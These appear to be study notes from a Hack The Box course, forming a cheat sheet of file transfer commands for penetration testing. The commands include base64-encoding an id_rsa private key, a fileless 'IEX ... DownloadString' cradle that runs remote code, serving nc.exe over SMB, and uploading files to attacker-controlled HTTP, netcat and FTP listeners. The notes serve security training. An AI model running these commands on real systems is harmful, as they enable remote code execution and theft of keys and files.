**method 1 : encodes transfer**
```shell-session
cat id_rsa |base64 -w 0;echo
```
```powershell-session
[IO.File]::WriteAllBytes("file_path",[Convert]::FromBase64String("base64 encoded string"))
```
```powershell-session
Get-FileHash file_path -Algorithm md5
```
								or
```powershell-session
[Convert]::ToBase64String((Get-Content -path "path" -Encoding byte))
o/p : base64 string

Get-FileHash "path" -Algorithm MD5 | select Hash
o/p : Hash
```

**method 2 : powershell**
```powershell-session
Invoke-WebRequest 'source url' -OutFile PowerView.ps1
```

**method 3 : powershell classes**
PowerShell, the [System.Net.WebClient](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient?view=net-5.0) class can be used to download a file over `HTTP`, `HTTPS` or `FTP`

|**Method**|**Description**|
|---|---|
|[OpenRead](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.openread?view=net-6.0)|Returns the data from a resource as a [Stream](https://docs.microsoft.com/en-us/dotnet/api/system.io.stream?view=net-6.0).|
|[OpenReadAsync](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.openreadasync?view=net-6.0)|Returns the data from a resource without blocking the calling thread.|
|[DownloadData](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloaddata?view=net-6.0)|Downloads data from a resource and returns a Byte array.|
|[DownloadDataAsync](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloaddataasync?view=net-6.0)|Downloads data from a resource and returns a Byte array without blocking the calling thread.|
|[DownloadFile](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadfile?view=net-6.0)|Downloads data from a resource to a local file.|
|[DownloadFileAsync](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadfileasync?view=net-6.0)|Downloads data from a resource to a local file without blocking the calling thread.|
|[DownloadString](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadstring?view=net-6.0)|Downloads a String from a resource and returns a String.|
|[DownloadStringAsync](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadstringasync?view=net-6.0)|Downloads a String from a resource without blocking the calling thread.|
```powershell-session
(New-Object Net.WebClient).DownloadFile('source url ','destination_path')
```
```powershell-session
(New-Object Net.WebClient).DownloadFileAsync('source url','destination_path')
```

**method 4 : Fileless Method**
[Invoke-Expression](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-expression?view=powershell-7.2) cmdlet or the alias `IEX`. fileless attacks work by using some operating system functions to download the payload and execute it directly
```powershell-session
IEX (New-Object Net.WebClient).DownloadString('source url')
```

**method 5 : SMB Download**
```shell-session
linux> sudo impacket-smbserver share -smb2support /tmp/smbshare -user username -password test
```
```cmd-session
windows> copy \\192.168.220.133\share\nc.exe
```

**method 6 : FTP Server**
```shell-session
linux> sudo pip3 install pyftpdlib
linux> sudo python3 -m pyftpdlib --port 21
windows> (New-Object Net.WebClient).DownloadFile('ftp://ip/dir', 'dest loc')
```

#### Create a Command File for the FTP Client and Download the Target File when shell interactive shell

Windows File Transfer Methods

```cmd-session
C:\htb> echo open 192.168.49.128 > ftpcommand.txt
C:\htb> echo USER anonymous >> ftpcommand.txt
C:\htb> echo binary >> ftpcommand.txt
C:\htb> echo GET file.txt >> ftpcommand.txt
C:\htb> echo bye >> ftpcommand.txt
C:\htb> ftp -v -n -s:ftpcommand.txt
ftp> open 192.168.49.128
Log in with USER and PASS first.
ftp> USER anonymous

ftp> GET file.txt
ftp> bye

C:\htb>more file.txt
This is a test file
```

## Upload Operations

**method 1 :  upload server**

by usigng python 'uploadserver' and powershell 'PSUpload.ps1'
```shell-session
python3 -m uploadserver

windows> IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')

windows> Invoke-FileUpload -Uri http://ip:port/upload -File file_path
```

base64 upload
```powershell-session
win> $b64 = [System.convert]::ToBase64String((Get-Content -Path 'file_path' -Encoding Byte))

win> Invoke-WebRequest -Uri http://ip:port/ -Method POST -Body $b64

lin> nc -lvnp port
```

**method 2 : FTP Uploads**

```shell-session
lin> sudo python3 -m pyftpdlib --port 21 --write

win> (New-Object Net.WebClient).UploadFile('ftp://IP/ftp-hosts', 'dest_path')
```

Create a Command File for the FTP Client to Upload a File for an non interractive shell

```cmd-session
C:\htb> echo open 192.168.49.128 > ftpcommand.txt
C:\htb> echo USER anonymous >> ftpcommand.txt
C:\htb> echo binary >> ftpcommand.txt
C:\htb> echo PUT c:\windows\system32\drivers\etc\hosts >> ftpcommand.txt
C:\htb> echo bye >> ftpcommand.txt
C:\htb> ftp -v -n -s:ftpcommand.txt
ftp> open 192.168.49.128

Log in with USER and PASS first.


ftp> USER anonymous
ftp> PUT c:\windows\system32\drivers\etc\hosts
ftp> bye
```
